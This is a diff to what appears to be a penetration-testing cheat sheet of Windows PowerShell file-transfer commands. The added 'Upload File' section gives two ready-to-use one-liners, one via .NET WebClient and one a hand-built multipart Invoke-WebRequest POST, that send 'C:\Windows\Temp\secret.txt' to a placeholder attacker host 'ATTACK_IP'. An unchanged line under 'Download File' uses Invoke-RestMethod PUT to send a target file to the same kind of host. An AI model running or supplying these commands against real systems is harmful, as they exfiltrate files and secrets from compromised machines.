@@ -1,5 +1,18 @@
 # Windows PowerShell
 
+## Upload File
+
+### 1) .NET Reflection
+
+	[void](New-Object System.Net.WebClient).UploadFile('http://ATTACK_IP/', "C:\Windows\Temp\secret.txt")
+
+### 2) Invoke-WebRequest
+
+	$filePath = 'C:\Windows\Temp\secret.txt' ; $uploadUri = 'http://ATTACK_IP/' ; $file = try { Get-Item $filePath -ErrorAction Stop } catch { throw $_.Exception } ; $fileContents = $(-join[char[]][System.IO.File]::ReadAllBytes($file.FullName)) ; $formBoundaryBegin = '----l337PwnzFormBoundary' ; $formBoundaryEnd = $formBoundaryBegin + "--`r`n" ; $formBody = "$formBoundaryBegin`nContent-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"`nContent-Type: application/octet-stream`n`n$fileContents`n$formBoundaryEnd" ; $parameters = @{'Method' = 'POST'; 'Uri' = $uploadUri ; 'Headers' = @{ 'Content-Type' = "multipart/form-data; boundary=$formBoundaryBegin" } ; 'Body' = $formBody } ; Invoke-WebRequest @parameters
+
+
+## Download File
+
 ### 1) Invoke-RestMethod
 
 	Invoke-RestMethod -Uri http://ATTACK_IP:PORT/REMOTE_FILE -Method PUT -InFile TARGET_FILE
